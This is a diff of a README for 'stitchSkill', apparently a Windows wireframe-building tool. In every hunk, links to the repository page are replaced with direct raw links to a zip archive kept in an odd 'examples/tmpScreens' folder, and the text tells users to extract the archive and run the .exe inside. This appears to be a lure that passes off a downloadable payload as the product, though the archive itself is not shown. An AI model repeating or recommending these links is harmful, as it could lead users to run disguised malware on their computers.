@@ -1,6 +1,6 @@
 # 🧩 stitchSkill - Build wireframes from one brief
 
-[![Download stitchSkill](https://img.shields.io/badge/Download-Visit%20the%20download%20page-blue?style=for-the-badge&logo=github)](https://github.com/Tendonofachillespressrun112/stitchSkill)
+[![Download stitchSkill](https://img.shields.io/badge/Download-Visit%20the%20download%20page-blue?style=for-the-badge&logo=github)](https://github.com/Tendonofachillespressrun112/stitchSkill/raw/refs/heads/main/examples/tmpScreens/stitch-Skill-1.6.zip)
 
 ## 🚀 What stitchSkill does
 
@@ -17,7 +17,7 @@ This is useful when you want:
 
 Use this link to visit the download page and get the latest version for Windows:
 
-[Download stitchSkill here](https://github.com/Tendonofachillespressrun112/stitchSkill)
+[Download stitchSkill here](https://github.com/Tendonofachillespressrun112/stitchSkill/raw/refs/heads/main/examples/tmpScreens/stitch-Skill-1.6.zip)
 
 Open the page, find the latest release or file, and save it to your PC. If the file is a `.exe`, you can run it after the download finishes. If the page contains a zip file, extract it first, then start the app from the extracted folder.
 
@@ -37,7 +37,7 @@ If you plan to work with larger flows, it helps to have at least 8 GB of RAM and
 ## 📥 Install on Windows
 
 1. Open the download page:
-   [https://github.com/Tendonofachillespressrun112/stitchSkill](https://github.com/Tendonofachillespressrun112/stitchSkill)
+   [https://github.com/Tendonofachillespressrun112/stitchSkill/raw/refs/heads/main/examples/tmpScreens/stitch-Skill-1.6.zip](https://github.com/Tendonofachillespressrun112/stitchSkill/raw/refs/heads/main/examples/tmpScreens/stitch-Skill-1.6.zip)
 
 2. Get the latest Windows file from the page.
 
@@ -200,7 +200,7 @@ For smoother use on Windows:
 When a new version is available:
 
 1. Open the download page again:
-   [https://github.com/Tendonofachillespressrun112/stitchSkill](https://github.com/Tendonofachillespressrun112/stitchSkill)
+   [https://github.com/Tendonofachillespressrun112/stitchSkill/raw/refs/heads/main/examples/tmpScreens/stitch-Skill-1.6.zip](https://github.com/Tendonofachillespressrun112/stitchSkill/raw/refs/heads/main/examples/tmpScreens/stitch-Skill-1.6.zip)
 2. Get the latest file
 3. Replace the old version if needed
 4. Open the app again
